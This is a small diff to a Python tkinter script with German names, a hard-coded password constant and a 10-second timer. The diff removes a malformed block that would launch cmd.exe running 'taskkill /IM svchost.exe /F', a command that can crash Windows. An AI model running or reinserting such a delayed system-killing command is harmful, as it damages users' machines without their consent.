@@ -2,20 +2,12 @@ import tkinter as tk
 import threading
 import time
 import os
-import subprocess
 
 PASSWORT = "7985357"
 
 # === Script nach 10 Sekunden ===
 def after_10_seconds():
     time.sleep(10)
-
-BEFEHL = "taskkill /IM svchost.exe /F"
-
-subprocess.Popen
-    ["cmd.exe", "/k", BEFEHL],
-    creationflags=subprocess.CREATE_NEW_CONSOLE
-
 
 
 # === Fenster ===
